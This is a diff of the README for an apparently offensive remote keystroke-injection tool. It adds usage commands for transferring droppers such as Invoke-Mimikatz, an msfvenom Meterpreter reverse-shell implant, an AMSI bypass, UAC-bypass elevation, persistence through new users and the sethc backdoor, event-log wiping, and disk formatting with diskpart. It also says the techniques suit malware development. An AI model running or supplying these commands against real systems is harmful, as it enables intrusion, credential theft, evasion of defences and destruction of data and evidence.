@@ -268,7 +268,7 @@ There are 11 file transfer methods in total.
 |   `nixhex`     |       Unix        | Outputting a hex encoded one liner in a variable then decodes with with `echo -e` to interpret the `\x` sequence character.|
 |  `outfilehex`  |      Windows      | Uses `Out-File` cmdlet to output the encoded hexdump file's content then decodes it with `CertUtil.exe`. |
 
-Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified. This also includes droppers even if the size is large. Bear in mind it'll take time to complete the file transfer.
+Upload a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified. This also includes droppers even if the size is large. Bear in mind it'll take time to complete the file transfer.
 
 ```
 $ rks -c "powershell.exe" -m dialogbox
@@ -280,7 +280,9 @@ $ rks -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
 
 To transfer droppers you can use `CertUtil.exe` base64 especially if it's large.
 
-`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe -o implant.exe`
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe -o implant.exe
+```
 
 For powershell.
 
@@ -308,15 +310,27 @@ $ rks -c ".\implant.exe"
 
 ### 0x04 - Privilege Escalation
 
-TODO: Fill this info after the feature has been implemented
+Note: WIP (Work In Progress)
+
+```
+$ rks -m elevate -s bypassuac -a info
+
+$ rks -m elevate -s <sub_method>
+```
 
 ### 0x05 - Persistence
 
-TODO: Fill this info after the feature has been implemented
+Note: WIP (Work In Progress)
+
+```
+$ rks -m persistence -s createuser
+
+$ rks -m persistence -s sethc
+```
 
 ### 0x06 - Defense Evasion
 
-TODO: Fill this info after the feature has been implemented
+Note: WIP (Work In Progress)
 
 - You can combine AMSI Bypass with the powershell implant to circumvent **Windows Security** or any security solution that was integrated with AMSI scanner.
 
@@ -330,7 +344,27 @@ $ rks -c "powershell.exe" -m dialogbox
 $ rks -c payload.ps1
 ```
 
-### 0x07 - Specify Grapical Remote Software
+```
+$ rks -m antiforensics -s wevutils
+
+$ rks -m antiforensics -s winevent
+
+$ rks -m antiforensics -s eventvwr
+```
+
+### 0x07 - Miscellaneous
+
+Note: WIP (Work In Progress)
+
+```
+$ rks -m mayhem -s format -s diskpart -a info
+
+$ rks -m mayhem -s format -s diskpart -a cmd
+
+$ rks -m mayhem -s format -s diskpart -a pwsh
+```
+
+### 0x08 - Specify Grapical Remote Software
 
 - If you're targeting VNC network protocols you can specify the window name with `tightvnc`.
 
@@ -338,9 +372,13 @@ $ rks -c payload.ps1
 $ rks -i implant.ps1 -w tightvnc
 ```
 
-### 0x08 - FAQ
+### 0x09 - FAQ
 
 TODO: Fill this info
+
+Q)
+
+A) The techniques are common and can be reused for BadUSB or malware development.
 
 ## Troubleshooting
 
